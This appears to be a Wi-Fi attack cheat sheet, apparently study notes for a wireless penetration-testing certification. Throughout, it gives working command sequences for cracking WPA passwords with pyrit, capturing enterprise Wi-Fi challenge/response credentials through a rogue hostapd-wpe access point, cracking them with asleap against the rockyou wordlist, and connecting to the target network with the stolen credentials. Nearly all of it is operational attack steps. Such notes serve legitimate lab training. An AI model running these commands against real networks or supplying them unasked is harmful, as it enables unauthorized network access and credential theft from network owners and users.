## Cracking with Pyrit

   airmon-ng start <interface> <AP_Channel>                                  ## setting the wireless card (wlan0) to monitor mode
   pyrit -r <interface> -o <capture_file> stripLive                          ## using pyrit to sniff in monitor mode interface by saving the capture process to a file

   pyrit -e <ESSID> create_essid                                             ## adding the ESSID of the access point to the pyrit database
   pyrit batch                                                               ## creating PMKs for ESSID
   pyrit -r <capture_file> -b <AP_MAC> attack_db                             ## cracking WPA password in database mode with pyrit
   
   ##- Change values of ssid and channel (that you can retrieve in previous step) with target ssid and channel details in the file **/etc/hostapd-wpe/hostapd-wpe.conf**  
`vim /etc/hostapd-wpe/hostapd-wpe.conf`

## Capture the encrypted credentials (challenge/response) by using **hostapd-wpe**:  
`hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf`  
It shows multiple lines, keep at least one line of challenge/response per username, save it for later use.

## Crack the challenge/response with rockyou as a wordlist:  
`asleap -C <Challenge> -R <Response> -W /usr/share/wordlist/rockyou.txt`

## Create a new configuration file with below content; replace SSID with target AP name (eg: dlink-my-router), identity with username and clear-text password that you cracked previously  
`nano oswp-enterprise.conf`

    network={
            scan_ssid=1
            eap=PEAP
            ssid="<TARGET-NAME>"
            key_mgmt=WPA-EAP
            identity="<DOMAIN\USERNAME>"
            password="<PASSWORD>"
            phase1="peaplabel=0"
            phase2="auth=MSCHAPV2"
    }

## Connect to the configured enterprise WiFi  
`wpa_supplicant -B -i wlan0 -c ./<filename>.conf`
